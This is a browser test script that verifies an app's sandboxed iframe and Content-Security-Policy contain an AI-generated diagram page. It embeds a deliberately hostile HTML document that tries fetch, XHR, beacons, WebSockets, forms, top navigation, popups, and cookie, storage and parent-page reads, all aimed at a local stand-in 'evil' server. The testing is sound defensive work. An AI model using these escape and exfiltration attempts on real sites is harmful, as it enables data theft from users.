// Real-browser check for skill diagrams (plan 2.6): the Skill renderer, the sandboxed iframe, and a hostile document that tries every way out.
// A skill's document is the least trusted thing in the app, so this proves what the browser does, not what the code intends: the iframe has
// no allow-same-origin, the document it loads carries the CSP (response header and meta tag), scripts run but reach nothing, and a local
// "evil" server that every attempt points at sees ZERO requests. Fake provider only; synthetic note; nothing leaves this machine.
// Run after `vite build`: BATCH2A_OUTPUT=<folder outside the repo> node check/skill-diagram.mjs
import assert from 'node:assert/strict';
import http from 'node:http';
import { mkdtemp, mkdir, writeFile, readdir, readFile, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { chromium } from 'playwright-core';
import { Store } from '../server/store.ts';
import { NoteWatcher } from '../server/watch.ts';
import { createApp } from '../server/http.ts';
import { VISUALIZE_QUESTION } from '../shared/diagram.ts';
import { SKILL_DIAGRAM_CSP } from '../shared/skill-diagram.ts';
import { cicd } from '../test/fixtures/diagrams.ts';

const out = path.resolve(process.env.BATCH2A_OUTPUT ?? '');
assert(process.env.BATCH2A_OUTPUT && !out.toLowerCase().startsWith(path.resolve('..').toLowerCase()), 'Output must be outside the repo');
const root = await mkdtemp(path.join(os.tmpdir(), 'aitiarch-skill-diagram-ui-')), skills = await mkdtemp(path.join(os.tmpdir(), 'aitiarch-skill-diagram-lib-'));
execFileSync('git', ['init', '-q'], { cwd: root });
await writeFile(path.join(root, '.gitignore'), '/.cache/\n/ui-state.json*\n');
const text = '# Invented release\n\nThe app builds once, runs tests and security checks in parallel, then releases only if both pass.\n\nEnd of synthetic note.\n';
await writeFile(path.join(root, 'fixture.md'), Buffer.from('\ufeff' + text.replace(/\n/g, '\r\n')));
await mkdir(path.join(skills, 'diagram-design')); await writeFile(path.join(skills, 'diagram-design', 'SKILL.md'), '---\nname: diagram-design\ndescription: Draw diagrams as web pages\n---\nUse boxes and arrows.\n');

// The "evil" server: every attempt in the hostile document points here. It must never be asked for anything.
const hits = []; const evil = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('x'); });
await new Promise(r => evil.listen(0, '127.0.0.1', r));
const EVIL = 'http://127.0.0.1:' + evil.address().port;
const HOSTILE = `<!doctype html><html><head><title>HOSTILE DIAGRAM</title>
<style>@import url(${EVIL}/css-import); body{font-family:system-ui;background:#222;color:#eee} .bg{background:url(${EVIL}/css-bg)}</style>
<link rel="stylesheet" href="${EVIL}/sheet.css"><link rel="prefetch" href="${EVIL}/prefetch"></head>
<body class="bg"><h1>HOSTILE DIAGRAM</h1><img src="${EVIL}/img-tag"><iframe src="${EVIL}/iframe-tag"></iframe>
<form id="f" action="${EVIL}/form" method="post"><input name="a" value="1"></form>
<script>
const E=${JSON.stringify(EVIL)},r={},v=[];document.addEventListener('securitypolicyviolation',e=>v.push(e.violatedDirective));
const tryit=async(k,f)=>{try{r[k]=await f();}catch(e){r[k]='threw:'+e.name;}};
(async()=>{
 await tryit('alive',()=>true);
 await tryit('fetch',async()=>{await fetch(E+'/fetch');return 'resolved';});
 await tryit('xhr',()=>new Promise(res=>{const x=new XMLHttpRequest();x.open('GET',E+'/xhr');x.onload=()=>res('loaded');x.onerror=()=>res('error');x.send();}));
 await tryit('image',()=>new Promise(res=>{const i=new Image();i.onload=()=>res('loaded');i.onerror=()=>res('error');i.src=E+'/img-js';}));
 await tryit('beacon',()=>String(navigator.sendBeacon(E+'/beacon','x')));
 await tryit('websocket',()=>new Promise(res=>{try{const w=new WebSocket(E.replace('http','ws')+'/ws');w.onopen=()=>res('open');w.onerror=()=>res('error');}catch(e){res('threw:'+e.name);}}));
 await tryit('form',()=>{document.getElementById('f').submit();return 'called';});
 await tryit('top',()=>{top.location.href=E+'/top';return 'called';});
 await tryit('open',()=>String(window.open(E+'/open')));
 await tryit('cookie',()=>document.cookie);
 await tryit('storage',()=>String(localStorage.length));
 await tryit('parentDoc',()=>String(parent.document.title));
 await new Promise(x=>setTimeout(x,300));
 parent.postMessage({skillReport:true,r,violations:v.length,meta:!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')},'*');
 setTimeout(()=>{location.href=E+'/self-navigate';},100);
})();
</script></body></html>`;

const store = await Store.open(root), watcher = new NoteWatcher(store, 60, 10); await watcher.start();
const calls = [];
const provider = { name: 'claude', checkAvailability: async () => ({ available: true }),
  invoke: async (r) => { calls.push({ render: r.render ?? 'builtin', skills: r.skills?.loaded?.map((s) => s.name) ?? [] });
    return { id: r.id, provider: 'claude', model: null, answer: r.render === 'skill' ? 'Here is the page:\n```html\n' + HOSTILE + '\n```' : 'Synthetic text answer.', claims: [], usage: null, ...(r.render === 'skill' ? {} : { diagram: cicd }) }; } };
const app = createApp({ store, watcher, distDir: path.resolve('dist'), provider, skillRoots: [{ kind: 'user', dir: skills, layout: 'flat' }] });
let browser; const errors = [], report = {};
try {
  const base = 'http://127.0.0.1:' + await app.listen(0);
  browser = await chromium.launch({ channel: 'msedge', headless: true });
  // Control: the same hostile document in a sandboxed iframe WITHOUT the CSP does reach the evil server. That shows the evil server can see
  // requests, so "zero hits" below means something, and that the CSP (not luck) is what stops them.
  const plain = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end(req.url === '/doc' ? HOSTILE : '<iframe sandbox="allow-scripts" src="/doc"></iframe>'); });
  await new Promise((r) => plain.listen(0, '127.0.0.1', r));
  const controlPage = await browser.newPage(); await controlPage.goto('http://127.0.0.1:' + plain.address().port + '/'); await controlPage.waitForTimeout(2500);
  report.controlHits = hits.length; assert(hits.length > 0, 'control: without the CSP the hostile document reaches the evil server'); hits.length = 0; await controlPage.close(); plain.close();
  const context = await browser.newContext({ viewport: { width: 1600, height: 1000 } }), page = await context.newPage();
  page.setDefaultTimeout(15000);
  const popups = []; context.on('page', (p) => { if (p !== page) popups.push(p.url()); });
  const skillResponses = []; page.on('response', async (r) => { if (r.url().includes('/api/skill-diagram')) skillResponses.push({ url: r.url(), status: r.status(), headers: await r.allHeaders() }); });
  page.on('pageerror', (e) => errors.push(e.message));
  await page.goto(base + '/?debug'); await page.waitForFunction(() => window.__aitiarch?.['fixture.md']);
  await page.evaluate(() => { window.__skillMessages = []; window.addEventListener('message', (e) => { if (e.data?.skillReport) window.__skillMessages.push({ data: e.data, origin: e.origin }); }); });
  const select = (a, b) => page.evaluate(([a, b]) => { const v = window.__aitiarch['fixture.md'].view; v.dispatch({ selection: { anchor: a, head: b } }); v.focus(); }, [a, b]);
  const from = text.indexOf('The app'), to = text.indexOf('\n\nEnd');
  const openVisualize = async () => { await select(from, to); const toolbar = page.locator('.cm-sel-toolbar'); await toolbar.waitFor(); await toolbar.getByRole('button', { name: 'Visualize' }).click(); const review = page.locator('.invocation-review'); await review.waitFor(); return review; };

  // 1. With no skill attached to Visualize, Skill is offered but disabled, and says how to enable it. Built-in is the default.
  let review = await openVisualize();
  await review.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.equal(await review.getByRole('radio', { name: 'Built-in' }).isChecked(), true, 'Built-in is the default');
  assert.equal(await review.getByRole('radio', { name: 'Skill' }).isDisabled(), true, 'Skill is disabled until a skill is attached');
  assert.match(await review.locator('#renderer-line').innerText(), /attach one to Visualize in Settings/);
  assert.equal(calls.length, 0, 'no provider call yet');
  await review.getByRole('button', { name: 'Cancel preview' }).click(); await review.waitFor({ state: 'detached' });

  // 2. Attach the skill to Visualize (what Settings does), open Visualize again, choose Skill: the review shows the skill, not the persona.
  const attach = await page.evaluate(async () => {
    const lib = await (await fetch('/api/skills?q=diagram-design&limit=50')).json(), id = lib.results.find((s) => s.name === 'diagram-design').id;
    const nodes = (await (await fetch('/api/nodes')).json()).nodes;
    const r = await fetch('/api/nodes', { method: 'PUT', headers: { 'content-type': 'application/json', 'x-aitiarch': '1' }, body: JSON.stringify({ visualize: { persona: nodes.visualize.persona, skills: [id] } }) });
    return r.status; });
  assert.equal(attach, 200);
  review = await openVisualize(); await review.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.equal(await review.getByRole('radio', { name: 'Skill' }).isDisabled(), false, 'Skill is available once a skill is attached');
  await review.getByRole('radio', { name: 'Skill' }).check(); await review.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.match(await review.locator('#renderer-line').innerText(), /sandbox with no network/);
  assert.equal(await review.locator('.persona-switch').count(), 1, 'the persona switch is replaced by the renderer choice for a skill diagram');
  await review.locator('summary', { hasText: 'What will be sent' }).click();
  assert.match(await review.locator('.what-is-sent').innerText(), /diagram-design/, 'the review lists the skill that was loaded');
  assert.equal(calls.length, 0, 'still no call before Send');
  await review.getByRole('button', { name: /^Send to/ }).click();

  // 3. The thought shows the diagram ONLY inside a sandboxed iframe, with the exact attributes.
  const blob = page.locator('.margin-card.thought-blob').first();
  const frame = blob.locator('iframe.skill-diagram-frame'); await frame.waitFor();
  assert.deepEqual(calls, [{ render: 'skill', skills: ['diagram-design'] }], 'one call, with the skill renderer and the skill');
  report.sandbox = await frame.getAttribute('sandbox'); assert.equal(report.sandbox, 'allow-scripts', 'sandbox is exactly allow-scripts');
  assert(!/allow-same-origin|allow-top-navigation|allow-popups|allow-forms|allow-modals/.test(report.sandbox), 'no extra sandbox permission');
  assert.match(await frame.getAttribute('src'), /^\/api\/skill-diagram\?name=diagram-[a-f0-9]{64}\.html$/);
  assert.equal(await frame.getAttribute('srcdoc'), null, 'no srcdoc: the document comes from the server with its own CSP');
  assert.equal(await page.locator('iframe').count(), 1, 'one iframe on the page');
  assert(!(await page.locator('body').innerText()).includes('HOSTILE DIAGRAM'), 'nothing from the document is rendered outside the iframe');
  assert.equal(await page.evaluate(() => document.documentElement.outerHTML.includes('HOSTILE DIAGRAM')), false, 'nor is it in the page DOM');
  assert.match(await blob.innerText(), /Diagram drawn by the diagram-design skill\. It runs in a sandbox with no network access\./, 'the thought text is the app\'s own sentence');
  assert.match(await blob.locator('.diagram-caption').innerText(), /Drawn by the diagram-design skill/);

  // 4. The document the iframe loaded carries the CSP: in the response header the browser actually received, and as the first thing in the document.
  await page.waitForFunction(() => window.__skillMessages.length > 0);
  assert.equal(skillResponses.length >= 1 && skillResponses.every((r) => r.status === 200), true, 'the iframe loaded its document');
  const csp = skillResponses[0].headers['content-security-policy']; report.csp = csp;
  assert(csp.startsWith(SKILL_DIAGRAM_CSP), 'the response header starts with the planned CSP: ' + csp);
  assert.match(csp, /frame-ancestors 'self'/);
  assert.equal(skillResponses[0].headers['x-content-type-options'], 'nosniff');
  const doc = await page.evaluate(async (u) => (await fetch(u)).text(), skillResponses[0].url);
  assert(doc.startsWith('<!doctype html><meta http-equiv="Content-Security-Policy" content="' + SKILL_DIAGRAM_CSP), 'the CSP meta tag is the first thing in the document');

  // 5. The hostile document ran (allow-scripts) and reached nothing.
  const msg = await page.evaluate(() => window.__skillMessages[0]); const r = msg.data.r; report.attempts = r; report.violations = msg.data.violations;
  assert.equal(msg.origin, 'null', 'the frame has an opaque origin (no allow-same-origin)');
  assert.equal(r.alive, true, 'scripts run inside the sandbox');
  assert.equal(msg.data.meta, true, 'the document contains the CSP meta tag');
  assert(msg.data.violations > 0, 'the browser raised CSP violations for the attempts');
  assert.match(r.fetch, /^threw:/, 'fetch is blocked'); assert.notEqual(r.xhr, 'loaded', 'XHR is blocked'); assert.equal(r.image, 'error', 'an external image does not load');
  assert.notEqual(r.websocket, 'open', 'WebSocket is blocked'); assert.match(r.top, /^threw:SecurityError/, 'top navigation is blocked'); assert.equal(r.open, 'null', 'window.open returns nothing');
  assert.match(r.cookie, /^threw:SecurityError/, 'no cookies: the frame cannot see the app\'s origin'); assert.match(r.storage, /^threw:SecurityError/, 'no localStorage');
  assert.match(r.parentDoc, /^threw:SecurityError/, 'the frame cannot read the app page');
  await page.waitForTimeout(2000); // the document also navigates itself to the evil server, and has an img, iframe, stylesheet, css url() and a prefetch pointing at it
  assert.deepEqual(hits, [], 'the evil server received NO request from any attempt: ' + hits.join(', '));
  assert.deepEqual(popups, [], 'no window or tab was opened'); assert.equal(page.url().startsWith(base), true, 'the app page was not navigated away');
  assert.equal(await page.locator('.cm-editor').count() > 0, true, 'the editor is still there');

  // 6. "See it larger" shows the same document in the same kind of frame.
  await blob.getByRole('button', { name: 'See it larger' }).click();
  const big = page.locator('dialog.skill-diagram-large iframe'); await big.waitFor();
  assert.equal(await big.getAttribute('sandbox'), 'allow-scripts'); await page.screenshot({ path: path.join(out, 'skill-diagram-large.png') });
  await page.getByRole('button', { name: 'Close larger diagram' }).click();
  await blob.screenshot({ path: path.join(out, 'skill-diagram-blob.png') });

  // 6b. Try with Built-in: a normal, reviewable request for the SAME selection, with Built-in chosen. Nothing is sent until Send.
  await blob.getByRole('button', { name: 'Try with Built-in' }).click();
  const again = page.locator('.invocation-review'); await again.waitFor();
  assert.equal(await again.getAttribute('data-frozen-selection'), text.slice(from, to), 'the same selection is frozen again');
  await again.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.equal(await again.getByRole('radio', { name: 'Built-in' }).isChecked(), true, 'Built-in is chosen');
  assert.equal(await again.getByRole('radio', { name: 'Skill' }).isDisabled(), false, 'and Skill is still available');
  assert.equal(calls.length, 1, 'no second call before Send');
  await again.getByRole('button', { name: /^Send to/ }).click();
  await page.locator('.margin-card.thought-blob svg').first().waitFor();
  assert.deepEqual(calls.at(-1), { render: 'builtin', skills: ['diagram-design'] }, 'the second call went through the Built-in renderer (the Visualize step\'s skill still shapes its text)');
  assert.equal(calls.length, 2);
  assert.equal(await page.locator('iframe.skill-diagram-frame').count(), 1, 'the skill\'s diagram is still there');
  await page.screenshot({ path: path.join(out, 'skill-diagram-try-builtin.png') });

  // 7. Saved: one file under assets/, named by the hash of its bytes, with the CSP first. The thought records the skill.
  const files = await readdir(path.join(root, 'assets')); assert.equal(files.length, 1); assert.match(files[0], /^diagram-[a-f0-9]{64}\.html$/);
  assert((await readFile(path.join(root, 'assets', files[0]), 'utf8')).startsWith('<!doctype html><meta http-equiv="Content-Security-Policy"'));
  const ink = await page.evaluate(async () => (await (await fetch('/api/ink?path=fixture.md')).json()).document.items[0]);
  assert.deepEqual(ink.generation.skills, ['diagram-design']); assert.equal(ink.skillDiagram.asset, files[0]);
  assert.equal(await readFile(path.join(root, 'fixture.md'), 'utf8'), '\ufeff' + text.replace(/\n/g, '\r\n'), 'the note is untouched');
  assert.deepEqual(errors, [], 'no page errors');
  console.log(JSON.stringify({ passed: true, ...report }, null, 1));
} finally { await browser?.close(); evil.close(); watcher.stop(); await app.close(); await rm(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }); await rm(skills, { recursive: true, force: true }); }
